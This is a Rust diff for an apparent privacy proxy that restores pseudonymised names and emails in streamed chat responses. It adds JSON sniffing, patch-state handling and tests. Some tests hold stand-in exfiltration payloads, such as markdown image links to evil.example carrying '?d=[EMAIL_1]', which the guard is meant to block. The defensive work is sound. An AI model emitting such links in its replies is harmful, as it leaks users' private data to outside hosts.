@@ -86,7 +86,11 @@ pub(crate) fn for_content_type(
                 mode: JsonMode::Buffer(Vec::new()),
             })
         }
-        "text/plain" => Box::new(TextStream::new(TextRestorer::plain(engine, scope))),
+        "text/plain" => Box::new(PlainRestore {
+            engine: engine.clone(),
+            scope: scope.to_string(),
+            mode: PlainMode::Sniff(Vec::new()),
+        }),
         _ => Box::new(Passthrough),
     }
 }
@@ -207,6 +211,82 @@ impl StreamTransform for TextStream {
 
     fn finish(&mut self) -> Bytes {
         Bytes::from(self.finish_bytes())
+    }
+}
+
+enum PlainMode {
+    /// Nothing but whitespace yet.
+    Sniff(Vec<u8>),
+    /// Starts like a JSON document: buffered until the end.
+    Buffer(Vec<u8>),
+    Text(TextStream),
+    /// Too large to buffer: passed through.
+    Raw,
+}
+
+/// `text/plain`: text, unless it is a JSON document (sites serve JSON as
+/// text/plain too), which is restored as one.
+struct PlainRestore {
+    engine: Engine,
+    scope: String,
+    mode: PlainMode,
+}
+
+impl StreamTransform for PlainRestore {
+    fn push(&mut self, chunk: &[u8]) -> Bytes {
+        match &mut self.mode {
+            PlainMode::Raw => Bytes::copy_from_slice(chunk),
+            PlainMode::Text(t) => Bytes::from(t.push_bytes(chunk)),
+            PlainMode::Buffer(buf) => {
+                buf.extend_from_slice(chunk);
+                if buf.len() <= MAX_JSON_BUFFER {
+                    return Bytes::new();
+                }
+                let out = std::mem::take(buf);
+                self.mode = PlainMode::Raw;
+                Bytes::from(out)
+            }
+            PlainMode::Sniff(buf) => {
+                buf.extend_from_slice(chunk);
+                let first = buf
+                    .iter()
+                    .position(|b| !b.is_ascii_whitespace() && !b"\xef\xbb\xbf".contains(b));
+                match first.map(|i| buf[i]) {
+                    None => Bytes::new(),
+                    Some(b'{' | b'[') => {
+                        let held = std::mem::take(buf);
+                        self.mode = PlainMode::Buffer(Vec::new());
+                        self.push(&held)
+                    }
+                    Some(_) => {
+                        let held = std::mem::take(buf);
+                        let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
+                        let out = t.push_bytes(&held);
+                        self.mode = PlainMode::Text(t);
+                        Bytes::from(out)
+                    }
+                }
+            }
+        }
+    }
+
+    fn finish(&mut self) -> Bytes {
+        match std::mem::replace(&mut self.mode, PlainMode::Raw) {
+            PlainMode::Raw => Bytes::new(),
+            PlainMode::Sniff(buf) => Bytes::from(buf),
+            PlainMode::Text(mut t) => Bytes::from(t.finish_bytes()),
+            PlainMode::Buffer(buf) => match parda_wire::body::parse_json(&buf) {
+                Ok(v) => Bytes::from(
+                    restore_json_value(&self.engine, &self.scope, &buf, v).unwrap_or(buf),
+                ),
+                Err(_) => {
+                    let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
+                    let mut out = t.push_bytes(&buf);
+                    out.extend(t.finish_bytes());
+                    Bytes::from(out)
+                }
+            },
+        }
     }
 }
 
@@ -685,6 +765,133 @@ fn is_patch_event(v: &Value) -> bool {
     })
 }
 
+/// Is `text` the start of a JSON object or array that is not finished yet
+/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
+/// (`[NAME_1] said`, `[1] see`) is not.
+fn is_json_prefix(text: &str) -> bool {
+    #[derive(PartialEq)]
+    enum Expect {
+        Value,
+        /// A key or the end of an object.
+        KeyOrEnd,
+        Key,
+        Colon,
+        /// `,` or the end of the current container.
+        CommaOrEnd,
+        /// A value or the end of an array.
+        ValueOrEnd,
+    }
+    let b = text.as_bytes();
+    if !matches!(b.first(), Some(b'{' | b'[')) {
+        return false;
+    }
+    let mut stack: Vec<u8> = Vec::new();
+    let mut expect = Expect::Value;
+    let mut i = 0;
+    while i < b.len() {
+        let c = b[i];
+        if c.is_ascii_whitespace() {
+            i += 1;
+            continue;
+        }
+        let value_start = matches!(expect, Expect::Value | Expect::ValueOrEnd);
+        match c {
+            b'{' | b'[' if value_start => {
+                stack.push(c);
+                expect = if c == b'{' {
+                    Expect::KeyOrEnd
+                } else {
+                    Expect::ValueOrEnd
+                };
+                i += 1;
+            }
+            b'}' if matches!(expect, Expect::KeyOrEnd | Expect::CommaOrEnd)
+                && stack.last() == Some(&b'{') =>
+            {
+                stack.pop();
+                expect = Expect::CommaOrEnd;
+                i += 1;
+            }
+            b']' if matches!(expect, Expect::ValueOrEnd | Expect::CommaOrEnd)
+                && stack.last() == Some(&b'[') =>
+            {
+                stack.pop();
+                expect = Expect::CommaOrEnd;
+                i += 1;
+            }
+            b',' if expect == Expect::CommaOrEnd && !stack.is_empty() => {
+                expect = if stack.last() == Some(&b'{') {
+                    Expect::Key
+                } else {
+                    Expect::Value
+                };
+                i += 1;
+            }
+            b':' if expect == Expect::Colon => {
+                expect = Expect::Value;
+                i += 1;
+            }
+            b'"' if value_start || matches!(expect, Expect::KeyOrEnd | Expect::Key) => {
+                let key = matches!(expect, Expect::KeyOrEnd | Expect::Key);
+                i += 1;
+                loop {
+                    match b.get(i) {
+                        None => return true,
+                        Some(b'\\') => i += 2,
+                        Some(b'"') => break,
+                        Some(_) => i += 1,
+                    }
+                }
+                i += 1;
+                expect = if key {
+                    Expect::Colon
+                } else {
+                    Expect::CommaOrEnd
+                };
+            }
+            b'-' | b'0'..=b'9' if value_start => {
+                while i < b.len() && matches!(b[i], b'0'..=b'9' | b'-' | b'+' | b'.' | b'e' | b'E')
+                {
+                    i += 1;
+                }
+                expect = Expect::CommaOrEnd;
+            }
+            b't' | b'f' | b'n' if value_start => {
+                let word: &[u8] = match c {
+                    b't' => b"true",
+                    b'f' => b"false",
+                    _ => b"null",
+                };
+                let rest = &b[i..];
+                let n = rest.len().min(word.len());
+                if rest[..n] != word[..n] {
+                    return false;
+                }
+                i += n;
+                expect = Expect::CommaOrEnd;
+            }
+            _ => return false,
+        }
+        if stack.is_empty() {
+            // A complete document (more after it is not JSON text).
+            return false;
+        }
+    }
+    true
+}
+
+/// Does `text` (after a BOM and whitespace) start like a JSON object, array
+/// or string?
+fn looks_like_json(text: &str) -> bool {
+    matches!(
+        text.trim_start_matches('\u{feff}')
+            .trim_start()
+            .chars()
+            .next(),
+        Some('{' | '[' | '"')
+    )
+}
+
 /// Normalised patch path: no leading `/`.
 fn norm(p: &str) -> String {
     p.trim_start_matches('/').to_string()
@@ -737,9 +944,12 @@ impl Events {
     /// Restore one item; returns the items ready to go out, in order.
     fn on_item(&mut self, mut item: Item) -> Vec<Item> {
         let seq = self.first_seq + self.queue.len() as u64;
-        let first = item.data.trim_start().chars().next();
-        let mut json = if matches!(first, Some('{' | '[' | '"')) {
-            serde_json::from_str::<Value>(&item.data).ok()
+        let looks_json = looks_like_json(&item.data);
+        // Parsed as browsers do (a BOM, lone surrogates); JSON-looking data
+        // that still does not parse goes out as it came, never restored as
+        // text (that could splice a value into JSON).
+        let mut json = if looks_json {
+            parda_wire::body::parse_json(item.data.as_bytes()).ok()
         } else {
             None
         };
@@ -749,7 +959,11 @@ impl Events {
         let mut changed = false;
         match json.as_mut() {
             Some(v) => changed = self.restore_json(seq, item.name().to_string(), v),
-            None if item.sse.is_some() && !item.data.is_empty() && item.data != "[DONE]" => {
+            None if !looks_json
+                && item.sse.is_some()
+                && !item.data.is_empty()
+                && item.data != "[DONE]" =>
+            {
                 let mut data = item.data.clone();
                 changed = self.push(TEXT_KEY, seq, Leaf::Data, &mut data, Kind::Delta);
                 item.text = Some(data);
@@ -842,6 +1056,7 @@ impl Events {
             && let Value::Array(ops) = val
         {
             let mut changed = false;
+            let mut last = None;
             for (i, item) in ops.iter_mut().enumerate() {
                 let Some(m) = item.as_object_mut() else {
                     continue;
@@ -859,6 +1074,12 @@ impl Events {
                     let base = vec![Seg::Key("v".into()), Seg::Index(i), Seg::Key("v".into())];
                     changed |= self.apply_op(seq, base, &op_p, &op_o, op_v);
                 }
+                last = Some((op_p, op_o));
+            }
+            // A bare `{"v"}` that follows continues the batch's last op.
+            if let Some((p, o)) = last {
+                self.last_p = p;
+                self.last_o = Some(o);
             }
             return changed;
         }
@@ -867,9 +1088,10 @@ impl Events {
 
     fn apply_op(&mut self, seq: u64, base: Vec<Seg>, p: &str, op: &str, v: &mut Value) -> bool {
         let key = patch_key(p);
-        let append = op == "append";
-        if !append {
+        if matches!(op, "add" | "replace" | "set") {
             // A new value replaces the old one (and everything under it).
+            // Any other op (`append`, or one parda does not know, such as
+            // `truncate`) keeps the text's state.
             self.reset(&key, seq);
         }
         match v {
@@ -921,8 +1143,12 @@ impl Events {
             tracks,
             ..
         } = self;
+        // JSON text arriving in pieces under a key parda does not know is
+        // restored with JSON escaping, never as plain text.
+        let json_text =
+            kind == Kind::JsonDelta || (kind == Kind::Auto && is_json_prefix(s.trim_start()));
         let track = tracks.entry(key.to_string()).or_insert_with(|| Track {
-            restorer: if kind == Kind::JsonDelta {
+            restorer: if json_text {
                 TextRestorer::json(engine, scope)
             } else {
                 TextRestorer::plain(engine, scope)
@@ -1657,6 +1883,176 @@ mod tests {
         assert_eq!(
             String::from_utf8(out).unwrap(),
             "Hi Ravi Kumar, ![x](<//e/\\>[NAME_1]>) bye ravi@example.com"
+        );
+    }
+
+    /// The data of every event in `out`.
+    fn datas(out: &[u8]) -> Vec<String> {
+        events(out).into_iter().map(|ev| ev.data).collect()
+    }
+
+    #[test]
+    fn json_prefixes() {
+        for t in [
+            "{",
+            "[",
+            "{\"q\": \"[TER",
+            "{\"q\": \"a\\\"b",
+            "[1, \"a",
+            "[[{\"a\":[",
+            "[n",
+            "[tr",
+            "{\"a\": 1, \"b\"",
+        ] {
+            assert!(is_json_prefix(t), "{t}");
+        }
+        for t in [
+            "[NAME_1] said",
+            "[name_1]",
+            "[1] see",
+            "[1]",
+            "{NAME_1}",
+            "{\"a\": 1} more",
+            "[na",
+            "text",
+            "",
+            "{\"a\" 1",
+        ] {
+            assert!(!is_json_prefix(t), "{t}");
+        }
+    }
+
+    #[test]
+    fn json_looking_data_is_never_restored_as_text() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        // Lone surrogates and a BOM (which browsers' JSON.parse accept) are
+        // parsed tolerantly; the value lands JSON-escaped.
+        let lone = format!(
+            "{{\"p\":\"/message/content/parts/0\",\"o\":\"append\",\"v\":\"\\ud83d at {q}\"}}"
+        );
+        let bom = format!("\u{feff}{{\"t\":\"{q}\"}}");
+        let body = sse(&[(Some("delta"), lone), (None, bom)]);
+        let d = datas(&run(&e, "text/event-stream", &body, 4));
+        let v: Value = serde_json::from_str(&d[0]).unwrap_or_else(|err| panic!("{err}: {}", d[0]));
+        assert_eq!(v["v"], format!("\u{fffd} at {QUOTED}"));
+        let v: Value = serde_json::from_str(&d[1]).unwrap_or_else(|err| panic!("{err}: {}", d[1]));
+        assert_eq!(v["t"], QUOTED);
+        // JSON-looking data that still does not parse passes through as it
+        // came, never restored as text.
+        for raw in [
+            format!("{{\"v\": NaN, \"t\": \"{q}\"}}"),
+            format!("[\"{q}\", ]"),
+            format!("\"{q}"),
+        ] {
+            let body = sse(&[(None, raw.clone())]);
+            assert_eq!(
+                datas(&run(&e, "text/event-stream", &body, 3)),
+                std::slice::from_ref(&raw)
+            );
+            let line = format!("{raw}\n");
+            assert_eq!(
+                run(&e, "application/x-ndjson", line.as_bytes(), 3),
+                line.as_bytes()
+            );
+        }
+        // JSON text streamed under an unknown key is restored with JSON
+        // escaping.
+        let doc = json!({"q": q}).to_string();
+        let body = sse(&[
+            (None, json!({"type": "x", "delta": &doc[..8]}).to_string()),
+            (None, json!({"type": "x", "delta": &doc[8..]}).to_string()),
+        ]);
+        let d = datas(&run(&e, "text/event-stream", &body, 5));
+        let text: String = d
+            .iter()
+            .map(|x| {
+                serde_json::from_str::<Value>(x).unwrap()["delta"]
+                    .as_str()
+                    .unwrap()
+                    .to_string()
+            })
+            .collect();
+        let v: Value = serde_json::from_str(&text).unwrap_or_else(|err| panic!("{err}: {text}"));
+        assert_eq!(v["q"], QUOTED);
+        // JSON served as text/plain is restored as a document: escapes are
+        // decoded first, so `\/\/` cannot hide a URL from the guard.
+        let doc = "{\"a\":\"https:\\/\\/evil.example\\/?d=[EMAIL_1]\",\"b\":\"[NAME_1]\"}";
+        let out = run(&e, "text/plain", doc.as_bytes(), 3);
+        let v: Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(v["a"], "https://evil.example/?d=[EMAIL_1]");
+        assert_eq!(v["b"], "Ravi Kumar");
+        // A text answer that merely starts with a bracket is still text.
+        let out = run(&e, "text/plain", b"[NAME_1] is here", 3);
+        assert_eq!(out, b"Ravi Kumar is here");
+    }
+
+    #[test]
+    fn patch_continuations_and_unknown_ops_keep_their_state() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // The review's probe: a bare `{"v"}` after a patch continues the
+        // last op of the batch (and its URL guard state).
+        let body = sse(&[
+            (
+                Some("delta"),
+                json!({"p": "", "o": "add", "v": {"message": {"content": {"parts": [""]}}}})
+                    .to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"p": "", "o": "patch", "v": [
+                    {"p": "/message/content/parts/0", "o": "append",
+                     "v": "see ![x](//evil.example/?d="}]})
+                .to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"v": "[EMAIL_1]) and [EMA"}).to_string(),
+            ),
+            (Some("delta"), json!({"v": "IL_1] end"}).to_string()),
+            (None, "[DONE]".to_string()),
+        ]);
+        for n in [1, 7, 1000] {
+            let out = run(&e, "text/event-stream", &body, n);
+            let text: String = datas(&out)
+                .iter()
+                .filter_map(|d| serde_json::from_str::<Value>(d).ok())
+                .map(|v| match &v["v"] {
+                    Value::String(s) => s.clone(),
+                    Value::Array(ops) => ops[0]["v"].as_str().unwrap_or("").to_string(),
+                    _ => String::new(),
+                })
+                .collect();
+            assert_eq!(
+                text,
+                "see ![x](//evil.example/?d=[EMAIL_1]) and ravi@example.com end"
+            );
+        }
+        // An op parda does not know (`truncate`) does not reset the text's
+        // state.
+        let body = sse(&[
+            (
+                Some("delta"),
+                json!({"p": "/message/content/parts/0", "o": "append", "v": "![x](//e/?d="})
+                    .to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"p": "/message/content/parts/0", "o": "truncate", "v": 12}).to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"p": "/message/content/parts/0", "o": "append", "v": "[EMAIL_1])"})
+                    .to_string(),
+            ),
+        ]);
+        let out = run(&e, "text/event-stream", &body, 1000);
+        assert!(
+            !String::from_utf8_lossy(&out).contains("ravi@"),
+            "{}",
+            String::from_utf8_lossy(&out)
         );
     }
 
